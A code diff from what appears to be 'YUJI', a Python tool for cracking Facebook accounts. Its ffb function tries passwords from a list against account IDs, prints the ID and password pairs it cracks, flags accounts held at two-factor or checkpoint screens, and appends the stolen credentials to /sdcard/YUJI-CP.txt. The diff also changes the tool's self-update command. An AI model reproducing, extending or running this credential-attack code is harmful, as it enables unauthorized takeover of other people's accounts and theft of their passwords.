@@ -312,7 +312,9 @@ def YUJI():
                                 input(' PRESS ENTER TO BACK ')
                                 os.system('python FB.py')
                         elif xd in ['2','02']:
-                        	    os.system('git pull && python Encode.py')
+                        	    print(" TOOL UPDATING... PLEASE WAIT ")
+                                time.sleep(5.0)
+                        	    os.system('git pull && python FB.py')
     except requests.exceptions.ConnectionError:
                 print('\n NO INTERNET CONNECTION ...')
                 exit()
@@ -406,11 +408,12 @@ def ffb(ids,names,passlist):
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                #print('\r\r \033[1;49;96m[YUJI-2F] '+ids+' | '+pas+ ' '+joined(ids)+' ')
+                                                print('\r\r \033[1;49;96m[YUJI-2F] '+ids+' | '+pas+ ' '+joined(ids)+' ')
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
+                                        	    print('\r\r\x1b[1;49;93m [YUJI-CP] '+ids+'\033[1;37m | \033[1;33m'+pas+ ' '+joined(ids)+' ')
                                                 open('/sdcard/YUJI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 ids2.append(ids)
                                                 break
